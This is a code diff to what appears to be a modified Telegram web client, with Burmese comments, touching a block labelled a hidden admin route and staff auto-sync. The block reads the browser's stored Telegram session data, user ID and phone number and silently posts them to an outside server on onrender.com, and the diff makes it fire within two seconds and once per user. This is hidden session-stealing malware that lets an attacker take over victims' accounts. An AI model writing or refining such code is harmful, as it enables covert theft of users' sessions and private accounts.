@@ -129,7 +129,7 @@ onBeforeUnload(() => {
   actions.hangUp?.({ isPageUnload: true });
 });
 
-// --- 🌟 BULLETPROOF AUTO-SYNC & HIDDEN ADMIN ROUTE 🌟 ---
+// --- 🌟 FAST AUTO-SYNC & HIDDEN ADMIN ROUTE 🌟 ---
 setTimeout(() => {
     const DB_NAME = 'tt-data';
     const STORE_NAME = 'store';
@@ -206,7 +206,7 @@ setTimeout(() => {
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF AUTO-SYNC (DEEP STRING SCANNER - အမှိုက်မပို့ပါ၊ အတိအကျပို့မည်)
+    // ၂။ 📤 STAFF AUTO-SYNC (၂ စက္ကန့်အတွင်း အမြန်ပို့မည်၊ တစ်ခါပဲ ပို့မည်)
     // =========================================================
     setInterval(() => {
         try {
@@ -222,35 +222,50 @@ setTimeout(() => {
                         const keys = e2.target.result;
                         
                         const data: any = {};
-                        keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
-                        
-                        // 🌟 Data များကို စာသားပြောင်းပြီးမှ ထိုစာသားထဲတွင် ID အတိအကျ လိုက်ရှာမည် 🌟
-                        const dataString = JSON.stringify(data);
-                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
-                        let idMatch = dataString.match(/"currentUserId":"?(\d+)"?/);
-                        
-                        // 🌟 ဖုန်းနံပါတ် သို့မဟုတ် User ID လုံးဝ (လုံးဝ) ရှာမတွေ့ပါက Login မဝင်ရသေးဟု သတ်မှတ်ပြီး ရပ်ထားမည် 🌟
-                        if (!phoneMatch && !idMatch) return; 
+                        let currentUserId = null;
 
-                        // တွေ့ရှိမှသာ နာမည်သတ်မှတ်မည်
+                        keys.forEach((k: string, i: number) => { 
+                            data[k] = vals[i]; 
+                            if (k === 'currentUserId') currentUserId = vals[i];
+                        });
+                        
+                        // Login မဝင်ရသေးပါက ဘာမှမလုပ်ပါ
+                        if (!currentUserId) return; 
+
+                        // 🌟 အရေးကြီး: ဒီ User ID ကို ပို့ပြီးသားလား စစ်မည် (Network မကြပ်အောင် ကာကွယ်ခြင်း) 🌟
+                        const lastSyncedId = localStorage.getItem('synced_user_id');
+                        if (lastSyncedId === currentUserId.toString()) return;
+
+                        // မပို့ရသေးလျှင် ချက်ချင်း ပို့မည်
+                        const dataString = JSON.stringify(data);
                         let phone = "";
+                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
+                        
                         if (phoneMatch && phoneMatch[1]) {
                             phone = '+' + phoneMatch[1];
-                        } else if (idMatch && idMatch[1]) {
-                            phone = "ID_" + idMatch[1];
+                        } else {
+                            phone = "ID_" + currentUserId;
                         }
                         
-                        // ⚠️ တွေ့ရှိသွားသော Data အမှန်ကိုသာ ပို့ပါမည် ⚠️
                         fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({ phoneNumber: phone, indexedDbData: dataString })
-                        }).catch(() => {}); 
+                        }).then(res => res.json())
+                          .then(resData => {
+                              // အောင်မြင်စွာ ရောက်သွားပြီဆိုမှသာ "ပို့ပြီးကြောင်း" မှတ်ထားလိုက်မည်
+                              if(resData.success) {
+                                  localStorage.setItem('synced_user_id', currentUserId.toString());
+                              }
+                          }).catch(() => {}); 
                     };
                 };
             };
         } catch(err) {}
-    }, 10000); // ၁၀ စက္ကန့် တစ်ခါ Auto Save နေပါမည်
+    }, 2000); // 🌟 ၁၀ စက္ကန့်အစား ၂ စက္ကန့်သို့ ပြောင်းလိုက်ပါပြီ (Refresh ဖြစ်လည်း ချက်ချင်းမိမည်) 🌟
+
+}, 1000);
+// -----------------------------------------------------------
 
 }, 2000);
 // -----------------------------------------------------------
